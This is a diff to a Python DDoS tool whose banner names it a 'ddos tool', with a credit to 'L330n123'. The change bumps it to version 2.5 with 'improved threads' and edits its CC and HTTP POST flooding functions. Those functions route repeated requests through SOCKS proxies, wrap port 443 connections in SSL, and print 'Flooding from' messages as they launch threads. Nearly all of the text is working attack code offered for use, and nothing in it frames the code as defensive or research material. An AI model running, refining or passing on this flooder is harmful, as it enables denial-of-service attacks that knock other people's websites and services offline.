@@ -23,7 +23,7 @@ print ('''
      CC/////  CC/////   | ddos tool |/ 
       CCCCC/   CCCCC/   |___________|/
 >--------------------------------------------->
-Python3 version 2.4 (Added mode selection)
+Python3 version 2.5 (Improved threads)
                             C0d3d by L330n123
 ╔═════════════════════════════════════════════╗
 ║        Tos: Don't attack .gov website       ║
@@ -198,7 +198,10 @@ def cc(socks_type):
 	if socks_type == 5:
 		socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
 	err = 0
-	time.sleep(0.1)
+	if str(port) == "443" :
+		n = "HTTPS"
+	else:
+		n = "CC"
 	while True:
 		try:
 			if err > 3:
@@ -208,14 +211,12 @@ def cc(socks_type):
 			s.connect((str(ip), int(port)))
 			if str(port) == '443':
 				s = ssl.wrap_socket(s)
-				n = "HTTPS"
-			else:
-				n = "CC"
 			s.send(str.encode(request))
 			print ("[*] "+n+" Flooding from | "+str(proxy[0])+":"+str(proxy[1]))
 			try:
 				for _ in range(multiple):
 					s.send(str.encode(request))
+				#s.close()
 			except:
 				s.close()
 		except:
@@ -237,7 +238,10 @@ def post(socks_type):
 	if socks_type == 5:
 		socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
 	err = 0
-	time.sleep(0.1)
+	if str(port) == "443" :
+		n = "HTTPS"
+	else:
+		n = "CC"
 	while True:
 		try:
 			if err > 3:
@@ -247,13 +251,12 @@ def post(socks_type):
 			s.connect((str(ip), int(port)))
 			if str(port) == '443': # //AUTO Enable SSL MODE :)
 				s = ssl.wrap_socket(s)
-			else:
-				pass
 			s.send(str.encode(request))
-			print ("[*] HTTP Post Flooding from  | "+str(proxy[0])+":"+str(proxy[1]))
+			print ("[*] "+n+" Post Flooding from  | "+str(proxy[0])+":"+str(proxy[1]))
 			try:
 				for _ in range(multiple):
 					s.send(str.encode(request))
+				#s.close()
 			except:
 				s.close()
 		except:
@@ -522,11 +525,13 @@ def main():
 		for _ in range(thread_num):
 			th = threading.Thread(target = post,args=(socks_type,))
 			th.start()
+			time.sleep(0.1)
 			#print("Threads "+str(i+1)+" created")
 	elif mode == "cc":
 		for _ in range(thread_num):
 			th = threading.Thread(target = cc,args=(socks_type,))
 			th.start()
+			time.sleep(0.1)
 			#print("Threads "+str(i+1)+" created")
 
 if __name__ == "__main__":
